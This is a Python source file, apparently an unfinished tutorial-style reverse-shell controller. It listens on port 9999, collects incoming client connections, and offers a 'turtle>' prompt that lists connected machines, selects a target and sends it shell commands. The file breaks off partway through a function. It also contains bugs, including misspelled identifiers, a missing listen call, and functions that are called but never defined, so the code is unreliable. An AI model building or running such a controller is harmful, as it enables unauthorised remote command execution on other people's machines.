import socket
import sys
import threading
import time
from queue import Queue



NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create
def socker_ctreate():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket create error " + str(msg))


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, addres = s.accept()
            con.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addres)
            print("\nConnection has been establish: " + addres[0])
        except:
            print("Error accepting connections")


def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP" + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()



# Send command

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(2014), "utf-8")
            print(client_response, end="")



def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('Command is not recognized')

# Displays all current connections.

def list_connections():
    results = ''


